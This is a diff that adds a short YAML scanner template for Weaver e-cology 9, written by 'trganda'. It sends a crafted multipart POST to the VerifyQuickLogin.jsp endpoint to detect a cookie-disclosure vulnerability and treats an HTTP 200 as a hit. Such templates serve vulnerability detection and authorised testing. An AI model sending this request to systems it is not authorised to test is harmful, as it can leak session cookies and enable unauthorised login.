@@ -1,0 +1,31 @@
+name: ecology9-VerifyQuickLogin-cookie-disclose
+transport: http
+set:
+  r1: b"\x0D"
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mobile/plugin/VerifyQuickLogin.jsp
+      body: |
+        ------WebKitFormBoundarymVk33liI64J7GQaK{{r1}}
+        Content-Disposition: form-data; name="identifier"{{r1}}
+        {{r1}}
+        1{{r1}}
+        ------WebKitFormBoundarymVk33liI64J7GQaK{{r1}}
+        Content-Disposition: form-data; name="language"{{r1}}
+        {{r1}}
+        1{{r1}}
+        ------WebKitFormBoundarymVk33liI64J7GQaK{{r1}}
+        Content-Disposition: form-data; name="ipaddress"{{r1}}
+        {{r1}}
+        127.0.0.1{{r1}}
+        ------WebKitFormBoundarymVk33liI64J7GQaK--{{r1}}
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: trganda
+  links:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
